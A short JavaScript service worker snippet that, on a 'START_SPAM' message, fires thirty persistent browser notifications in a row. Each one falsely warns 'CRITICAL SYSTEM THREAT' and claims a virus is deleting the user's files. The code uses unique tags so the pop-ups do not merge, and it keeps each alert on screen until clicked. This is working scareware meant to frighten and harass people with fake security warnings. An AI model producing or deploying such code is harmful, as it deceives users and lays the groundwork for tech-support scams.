// This runs in the background
self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'START_SPAM') {
    let count = 0;
    
    // Set an interval to fire even if the tab is "backgrounded"
    const spammer = setInterval(() => {
      self.registration.showNotification("CRITICAL SYSTEM THREAT", {
        body: "Virus detected in local storage. Deleting files...",
        icon: "https://cdn-icons-png.flaticon.com",
        tag: "spam-" + count + "-" + Date.now(), // Unique tag forces separate pop-ups
        requireInteraction: true // Keeps the alert on screen until clicked
      });

      count++;
      if (count >= 30) clearInterval(spammer);
    }, 1000); // 1 second delay between alerts
  }
});
